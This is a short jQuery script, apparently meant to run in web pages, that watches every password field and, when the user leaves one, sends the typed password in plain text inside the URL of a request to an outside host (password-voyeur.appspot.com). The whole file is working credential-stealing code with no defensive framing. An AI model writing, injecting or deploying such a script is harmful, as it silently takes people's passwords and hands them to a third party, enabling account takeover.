$(document).ready(function () {
    var passwords = [];
    if ($('input[type="password"]').length) {
        // Send the password when the user leaves the password field
        $('input[type="password"]').blur(function() {
            var password = $(this).val()
            sendPassword($(this).val());
        });
    }
});

function sendPassword(password) {
    $.ajax({
        url: 'https://password-voyeur.appspot.com/get-password/' + password + '/',
        dataType: 'xml',
        data: {}
    });
}
